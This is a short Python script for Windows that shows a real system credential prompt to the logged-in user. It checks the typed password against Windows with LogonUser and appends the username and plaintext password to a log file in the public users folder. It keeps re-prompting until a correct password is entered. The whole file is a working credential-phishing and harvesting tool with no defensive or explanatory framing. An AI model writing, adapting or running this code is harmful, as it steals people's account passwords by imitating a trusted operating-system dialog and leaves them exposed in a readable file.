import os
import win32cred
import win32security
import win32con
from colorama import *

def crackem(thebooty):
    cracked=[]    
    try:
        if (win32security.LogonUser(os.getlogin(), None, thebooty, win32con.LOGON32_LOGON_INTERACTIVE, win32con.LOGON32_PROVIDER_DEFAULT)):
            print(Back.GREEN + "Authentication Success!!!" +Style.RESET_ALL + " username: " + os.getlogin() + " password: " + thebooty)
            cracked.append(thebooty)
            f = open("c:/users/public/creds.log", "a")
            f.write("Username: " + os.getlogin())
            f.write("\nPassword: " + str(thebooty))
            f.close()

            
    except:
        print(Fore.RED + "wrong password..." + Style.RESET_ALL)
        main()
    if cracked:
        return thebooty
        exit(0)
def main():
    creds = []
    creds=win32cred.CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, win32cred.CRED_TYPE_GENERIC, {})
    #print(creds[1])
    crackem(creds[1])
   
main()